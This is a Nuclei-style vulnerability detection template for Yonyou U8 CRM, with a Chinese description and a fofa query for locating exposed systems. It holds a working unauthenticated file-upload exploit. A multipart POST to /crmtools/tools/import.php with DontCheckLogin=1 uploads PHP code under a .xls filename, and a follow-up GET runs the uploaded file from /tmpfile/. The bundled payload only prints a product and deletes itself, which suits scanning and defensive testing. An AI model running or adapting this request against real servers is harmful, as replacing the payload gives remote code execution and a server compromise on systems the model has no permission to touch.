id: yongyouU8-CRM-import-files-upload

info:
  name: 用友U8 CRM import.php 文件上传致RCE漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: title="用友U8CRM"
    用友 U8 CRM客户关系管理系统 import.php 文件存在任意文件上传漏洞，未经身份验证的攻击者通过漏洞上传恶意后门文件，执行任意代码，从而获取到服务器权限。
  reference:
    - https://blog.csdn.net/m0_60571842/article/details/140657464
  tags: files upload

variables:
  username: "{{to_lower(rand_base(6))}}" #从可选字符集（默认为字母和数字）生成给定长度字符串的随机序列
  
http:
  - raw:
      - |
        POST /crmtools/tools/import.php?DontCheckLogin=1&issubmit=1 HTTP/1.1
        Host: {{Hostname}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye0z8QbHs79gL8vW5

        ------WebKitFormBoundarye0z8QbHs79gL8vW5
        Content-Disposition: form-data; name="xfile"; filename="1.xls"
        
        <?php print(1111*2222);unlink(__FILE__);?>
        ------WebKitFormBoundarye0z8QbHs79gL8vW5
        Content-Disposition: form-data; name="combo"

        {{username}}.php
        ------WebKitFormBoundarye0z8QbHs79gL8vW5--
  - raw:
      - |
        GET /tmpfile/{{username}}.php HTTP/1.1
        Host: {{Hostname}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '2468642'
      - type: status
        status: 
          - 200